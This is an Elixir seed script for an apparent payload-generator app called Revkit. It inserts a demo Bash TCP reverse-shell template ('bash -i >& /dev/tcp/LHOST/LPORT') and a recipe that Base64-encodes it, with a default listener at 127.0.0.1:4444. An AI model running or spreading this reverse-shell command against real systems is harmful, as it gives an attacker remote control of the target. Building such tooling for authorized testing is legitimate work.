# Seed a small, idempotent demo catalog.
#
#     mix ecto.reset
#
# The app only generates strings; these examples are never executed.

alias Revkit.Catalog

payload_name = "Bash TCP reverse shell"
recipe_name = "Bash TCP + Base64"

unless Enum.any?(Catalog.list_payloads(), &(&1.name == payload_name)) do
  {:ok, _payload} =
    Catalog.create_payload_with_tags(
      %{
        name: payload_name,
        description: "Interactive Bash reverse shell over TCP.",
        template: "bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1",
        target_os: "linux",
        target_shell: "bash",
        target_tools: ["bash"],
        notes: "Set LHOST to a listener reachable from the target.",
        favorite: true
      },
      ["linux", "reverse-shell"]
    )
end

unless Enum.any?(Catalog.list_recipes(), &(&1.name == recipe_name)) do
  {:ok, recipe} =
    Catalog.create_recipe(%{
      name: recipe_name,
      description: "Bash TCP payload encoded as Base64.",
      template: "bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1",
      variables: %{"LHOST" => "127.0.0.1", "LPORT" => "4444"},
      steps: [%{"key" => "base64_encode", "options" => %{}}],
      notes: "Requires bash on the target.",
      target_os: "linux",
      target_shell: "bash",
      target_tools: ["bash", "base64"]
    })

  {:ok, _recipe} = Catalog.put_recipe_tag_names(recipe, ["linux", "base64"])
end
